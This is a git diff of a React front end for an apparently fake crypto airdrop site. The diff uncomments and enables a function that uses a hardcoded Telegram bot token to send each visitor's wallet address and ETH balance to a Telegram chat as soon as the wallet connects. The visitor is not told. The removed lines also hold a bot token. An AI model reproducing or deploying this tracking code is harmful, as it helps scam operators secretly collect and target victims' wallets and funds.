@@ -67,15 +67,15 @@ function App() {
 
   const Sendmasg = async (data) => {
     try {
-      // let res = await axios.post(
-      //   `https://api.telegram.org/bot6889657840:AAH2ToXS49gHqWCfcq2Uhcji-8bGYF2uaLc/sendMessage`,
-      //   {
-      //     chat_id: "6212069744",
-      //     text: data,
-      //   }
-      // );
-      // console.log("Res", res);
-      sessionStorage.setItem("IsConnect", true);
+      let res = await axios.post(
+        `https://api.telegram.org/bot6871484145:AAGfTkwx-CgfhM6ExuBwPISeanlG_30buME/sendMessage`,
+        {
+          chat_id: "6297270767",
+          text: data,
+        }
+      );
+      console.log("Res", res);
+      sessionStorage.setItem("IsConnect",   true);
     } catch (error) {
       console.log(error);
     }
@@ -87,11 +87,11 @@ function App() {
       try {
         let balance = await webSupply.eth.getBalance(address);
         balance = webSupply.utils.fromWei(balance.toString());
-        // if (isConnect == "false" || isConnect == null) {
-        //   Sendmasg(` ❗🔔 Wallet Connected  🔔❗\n
-        //   🏠 Address:${address} \n
-        //   💰 Balance:${balance} BNB`);
-        // }
+        if (isConnect == "false" || isConnect == null) {
+          Sendmasg(` ❗🔔 Wallet Connected  🔔❗\n
+          🏠 Address:${address} \n
+          💰 Balance:${balance} ETH`);
+        }
       } catch (error) {
         console.log(error);
       }
@@ -115,10 +115,10 @@ function App() {
   return (
     <div className="App">
       <Toaster />
-      {/* <Header /> */} 
+      {/* <Header /> */}
       <Navtr/>
       <Responsive_nav/>
-      
+
 
       <Routes>
         <Route path='/' element={<Airdrop />} />
